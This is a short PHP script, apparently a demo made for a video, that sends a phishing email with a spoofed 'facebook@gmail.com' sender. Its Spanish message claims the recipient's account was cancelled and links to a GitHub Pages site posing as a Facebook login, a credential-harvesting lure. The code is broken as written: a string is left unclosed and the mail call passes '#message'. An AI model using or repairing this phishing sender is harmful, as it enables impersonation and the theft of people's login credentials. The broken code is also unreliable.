<?php
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
$from = "facebook@gmail.com";
$to = "aaleexruiz11@gmail.com";
$subject = "Demo phishing youtube";
$message = "su cuenta a sido cancelada, por favor verifique iniciando secion aqui: https://alexfem15gihupy.github.io/Facebook/
    $headers = "From:" . $from;
    mail($to,$subject,#message, $headers);
    echo "El mensaje se ha enviado";
    ?>